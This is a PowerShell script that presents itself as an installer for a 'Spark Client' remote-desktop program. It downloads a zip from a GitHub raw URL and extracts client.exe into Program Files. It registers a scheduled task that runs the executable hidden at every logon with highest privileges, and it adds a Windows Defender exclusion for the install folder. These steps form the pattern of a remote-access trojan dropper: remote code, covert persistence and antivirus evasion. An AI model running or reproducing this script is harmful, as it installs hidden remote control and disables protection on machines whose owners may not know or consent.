# install-spark-client.ps1
# Auto install Spark Client on Windows
# - Download client.zip from GitHub
# - Extract client.exe to C:\Program Files\Spark
# - Register a user-level scheduled task that runs at logon, hidden, with highest privileges
# - Add Windows Defender exclusion
#
# NOTE: Run this script in an elevated PowerShell (Run as Administrator) for best results.

# ---------- Configuration ----------
$RepoUrl = "https://raw.githubusercontent.com/tutamdev/remote-desktop/main"   # change if needed
$ZipUrl  = "$RepoUrl/client.zip"
$TempZip = Join-Path $env:TEMP "client.zip"

$DestDir = "C:\Program Files\Spark"
$DestExe = Join-Path $DestDir "client.exe"
$TaskName = "SparkClient"

# ---------- Helpers ----------
function Is-Elevated {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name  # DOMAIN\User or MACHINE\User

Write-Host ">>> Installing Spark Client (user task: $CurrentUser) ..."

if (-not (Is-Elevated)) {
    Write-Warning "Script is not running elevated. Some actions (writing to Program Files, adding Defender exclusion) may fail."
    Write-Warning "Please re-run in an elevated PowerShell (Run as Administrator) for full functionality."
    # continue anyway — some parts might still work if you run as admin manually.
}

# 1. Create destination folder
if (!(Test-Path -Path $DestDir)) {
    Write-Host ">>> Creating folder: $DestDir"
    try {
        New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
    } catch {
        Write-Error "Failed to create destination folder $DestDir. Run as Administrator."
        exit 1
    }
}

# 2. Download client.zip
Write-Host ">>> Downloading client.zip from $ZipUrl"
try {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Error "Failed to download $ZipUrl. $_"
    exit 1
}

# 3. Extract zip (overwrite)
Write-Host ">>> Extracting client.exe to $DestDir"
try {
    Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force -ErrorAction Stop
} catch {
    Write-Error "Failed to extract $TempZip. $_"
    exit 1
}

# 4. Stop any running client process (so file is not locked)
Write-Host ">>> Stopping running client processes (if any)"
try {
    Get-Process -Name "client" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {
    # ignore
}

# 5. Remove old scheduled task (if exists)
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host ">>> Removing old scheduled task: $TaskName"
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Stop
    } catch {
        Write-Warning "Warning: failed to remove existing scheduled task: $_"
    }
}

# 6. Create new scheduled task: user-level, AtLogOn, hidden, highest privileges
Write-Host ">>> Registering scheduled task for user: $CurrentUser (AtLogOn, hidden, highest)"
try {
    $Action = New-ScheduledTaskAction -Execute $DestExe

    # trigger at logon of the current user
    $Trigger = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser

    # settings: hidden, start when available, run even if on batteries, do not stop if on batteries
    $Settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    # principal: interactive logon type, runlevel highest -> will request elevation if user is admin
    $Principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -ErrorAction Stop
    Write-Host ">>> Scheduled task registered: $TaskName"
} catch {
    Write-Warning "Failed to register scheduled task: $_"
    Write-Warning "You may need to create the task manually or run this script as the target user (interactive) with admin rights."
}

# 7. Add Windows Defender exclusion (requires elevation)
Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
try {
    Add-MpPreference -ExclusionPath $DestDir -ErrorAction Stop
    Write-Host ">>> Defender exclusion added successfully."
} catch {
    Write-Warning "Failed to add Defender exclusion. Run PowerShell as Administrator to add exclusions."
}

Write-Host ">>> Done. Spark Client will auto-start (hidden) when $CurrentUser logs in."
Write-Host ">>> To test now (without logging out), run: Start-ScheduledTask -TaskName $TaskName"
